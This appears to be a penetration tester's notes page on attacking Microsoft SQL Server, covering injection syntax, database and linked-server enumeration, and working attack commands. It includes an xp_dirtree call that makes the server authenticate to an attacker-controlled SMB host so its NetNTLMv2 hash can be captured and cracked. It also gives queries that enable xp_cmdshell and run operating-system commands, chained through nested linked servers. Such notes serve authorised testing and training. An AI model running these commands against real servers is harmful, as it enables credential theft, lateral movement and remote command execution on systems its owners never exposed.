# Microsoft SQL

## Comment syntax

1. `--` denotes a single-line comment
	* `--COMMENT HERE`
	* No required whitespace, unlike MySQL
2. `/* */` denotes a multi-line comment
	* `/*COMMENT HERE*/` 

---

## Version query syntax

```sql
SELECT @@version
```

---

## String concatenation syntax

```sql
SELECT CONCAT(username, ':', password) FROM users
```

* Takes a variable number of arguments
* Arguments can be column names from the target table or string literals

---

## Time delay syntax

[Reference](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Unconditionally wait for 10 seconds

```sql
WAITFOR DELAY '0:0:10'
```

### Conditionally wait for 10 seconds

```sql
IF ($CONDITION) WAITFOR DELAY '0:0:10'
```

---

## Database enumeration

```sql
SELECT name, database_id, create_date FROM sys.databases
```

---

## Table enumeration

[[database-enumeration#Querying database tables non-Oracle]]

---

## Table column enumeration

[[database-enumeration#Querying database tables' columns non-Oracle]]

---

## MSSQL Client

- [[power-up-sql#Issue SQL Query to MSSQL Server|PowerUpSQL's Get-SQLQuery]]
- [[mssqlclient|impacket-mssqlclient]]
- [HeidiSQL](https://www.heidisql.com/)

---

## Enumerate a Domain's MSSQL Servers

1. [[power-up-sql#Discover MSSQL Servers on Current Domain|Discover MSSQL servers on the domain]]
2. [[power-up-sql#Determine Whether the Current Context can Interact with an MSSQL Server|Determine which MSSQL servers you have access to]]
3. For each accessible MSSQL Server, [[mssql#Enumerate an MSSQL Server's Linked Servers|enumerate its linked servers]]

---

## Capture MSSQL Server's NetNTLMv2 Hash

MSSQL's [xp_dirtree](https://www.sqlservercentral.com/blogs/how-to-use-xp_dirtree-to-list-all-files-in-a-folder) can be used to list a directory's structure, including at UNC paths. The MSSQL Server often runs as an elevated account. By leveraging existing access to interact with the MSSQL server and execute the `xp_dirtree` command to list a directory's structure *on an attacker-controlled host*, it is possible to capture the NetNTLMv2 hash of the elevated account for offline cracking.

1. Ensure you have privileges to interact with the target MSSQL server
	- [[power-up-sql#Determine Whether the Current Context can Interact with an MSSQL Server|PowerUpSQL]]
	- [[crackmapexec]]
2. Start listening and logging credentials
	- [[inveigh#Starting Listening Responding and Logging Credentials|Inveigh]]
	- [[responder#Start Responding|responder]]
	- `impacket-smbserver`
3. Coerce the MSSQL Server into connecting to the machine from step #2 via SMB

```sql
EXEC xp_dirtree '\\$FQDN_OR_IP\$SHARE', 1, 1
```

- `$FQDN_OR_IP` belongs to the machine that is listening and logging credentials from step #2
- `$SHARE` is either arbitrary or the specific name of the SMB share the machine from step #2 is serving, depending on the tool being used in step #2

4. [[hashcat#Offline dictionary attack against NetNTLMv2 hashes|Crack the corresponding NetNTLMv2 hash]]

---

## Determine Whether `xp_cmdshell` is Enabled on an MSSQL Server

First, determine whether MSSQL's [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) command is enabled by issuing the following query:

```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

If the `value` column is `0`, then `xp_cmdshell` is disabled.

---

## Enable `xp_cmdshell` on an MSSQL Server

```sql
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

---

## Disable `xp_cmdshell` on an MSSQL Server

```sql
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

---

## Execute Operating System Commands on an MSSQL Server

1. Ensure you have privileges to interact with the target MSSQL server
	- [[power-up-sql#Determine Whether the Current Context can Interact with an MSSQL Server|PowerUpSQL]]
	- [[crackmapexec]]
2. [[mssql#Determine Whether xp_cmdshell is Enabled on an MSSQL Server|Determine whether xp_cmdshell is enabled]]
3. [[mssql#Enable xp_cmdshell on an MSSQL Server|Enable xp_cmdshell if necessary]]
4. Execute commands

```sql
EXEC xp_cmdshell '$COMMAND';
```

5. [[mssql#Disable xp_cmdshell on an MSSQL Server|Disable xp_cmdshell if you previously enabled it]]

Note that [[power-up-sql#Execute Command on MSSQL Server|PowerUpSQL's InvokeSQLOSCmd]] automatically executes steps 2, 3, and 5 for you.

---

## Linked Servers

Microsoft SQL servers have a feature called Linked Servers that allow them to interact with other datastores, from other Microsoft SQL servers, other SQL servers, or even cloud data stores. This gives them the ability to query and include data from their Linked Servers in their own query responses.

---

## Enumerate an MSSQL Server's Linked Servers

### Standard Enumeration via SQL

```sql
SELECT * FROM master..sysservers;
```

- The resultant `srvname` column is the FQDN of the linked server
- The resultant `srvproduct` and `providername` columns give insight into what kind of data store the linked server is
	- `SQL Server` indicates it is a Microsoft SQL Server

### Recursive Enumeration via PowerShell

To recursively enumerate an MSSQL Server's linked servers, use [[power-up-sql#Recursively Enumerate an MSSQL Server's Linked Servers|PowerUpSQL's Get-SQLServerLinkCrawl]] cmdlet.

---

## Execute SQL Query on an MSSQL Server's Linked Server

```sql
SELECT * FROM OPENQUERY("$LINKED_SERVER_FQDN_OR_IP", '$SQL_QUERY');
```

---

## Determine Whether an MSSQL Server's Linked Server has `xp_cmdshell` Enabled

```sql
SELECT * FROM OPENQUERY("$LINKED_SERVER_FQDN_OR_IP", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

- Note that the first argument has double quotes and the second has single quotes--don't change this
- Note that single quotes within the second argument are escaped by doubling (i.e., for `'blah'`, use `''blah''`, as opposed to `\'blah\'`)

---

## Enable `xp_cmdshell` on an MSSQL Server's Linked Server

You can't leverage `OPENQUERY()` to enable `xp_cmdshell` on an MSSQL Server's linked server.

However, if `RPC Out` is enabled on the linked server (this is not the default configuration), then you can enable `xp_cmdshell` as so:

```sql
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [$LINKED_SERVER_FQDN_OR_IP]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [$LINKED_SERVER_FQDN_OR_IP]
```

- Note the square brackets around `$LINKED_SERVER_FQDN` are required

---

## Disable `xp_cmdshell` on an MSSQL Server's Linked Server

You can't leverage `OPENQUERY()` to enable `xp_cmdshell` on an MSSQL Server's linked server.

However, if `RPC Out` is enabled on the linked server (this is not the default configuration), then you can disable `xp_cmdshell` as so:

```sql
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [$LINKED_SERVER_FQDN_OR_IP]
EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;') AT [$LINKED_SERVER_FQDN_OR_IP]
```

- Note the square brackets around `$LINKED_SERVER_FQDN` are required

---

## Execute an Operating System Command on an MSSQL Server's Linked Server

Link relationship: (MSSQL Server A) --> (MSSQL Server B)

On MSSQL Server A:

```sql
SELECT * FROM OPENQUERY("$SERVER_B_FQDN_OR_IP", 'SELECT @@servername; EXEC xp_cmdshell ''$COMMAND''');
```

- Note the `SELECT` statement before the `EXEC` statement is often required for the `EXEC` statement to work within `OPENQUERY()`

---

## Execute an Operating System Command on the Linked Server of an MSSQL Server's Linked Server (2 Levels Deeper)

Link relationships: (Server A) --> (Server B) --> (Server C)

Executed on MSSQL Server A:

```sql
SELECT * FROM OPENQUERY("$SERVER_B_FQDN_OR_IP", 'SELECT * FROM OPENQUERY("$SERVER_C_FQDN", ''SELECT @@servername; EXEC xp_cmdshell ''''$COMMAND'''''')');
```

- Note the `SELECT` statement before the `EXEC` statement is often required for the `EXEC` statement to work within `OPENQUERY()`

---

## Command Execution Methodology on MSSQL Server's Linked Servers

For each linked server:

1.  [[mssql#Determine Whether an MSSQL Server's Linked Server has xp_cmdshell Enabled|Determine whether the linked server has xp_cmdshell enabled]]
2.  [[mssql#Enable xp_cmdshell on an MSSQL Server's Linked Server|Enable xp_cmdshell on the linked server if necessary]]
3.  Execute commands
	- [[mssql#Execute an Operating System Command on an MSSQL Server's Linked Server|One level deeper]]
	- [[mssql#Execute an Operating System Command on the Linked Server of an MSSQL Server's Linked Server 2 Levels Deeper|Two levels deeper]]
	- You can go N levels deep, just make sure you adjust the single quotes accordingly

5.  [[mssql#Disable xp_cmdshell on an MSSQL Server's Linked Server|Disable xp_cmdshell on the linked server if you enabled it]]

---

## Enumerate SQL Server Logins

If you have SQL command execution on a Microsoft SQL Server that is joined to a domain, you can use [this technique](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/) to enumerate SQL server logins.

---

## Enumerate Domain Principals

If you have SQL command execution on a Microsoft SQL Server that is joined to a domain, you can use [this technique](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/) to enumerate domain principals.

---

## References

[Pentest Monkey MSSQL Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
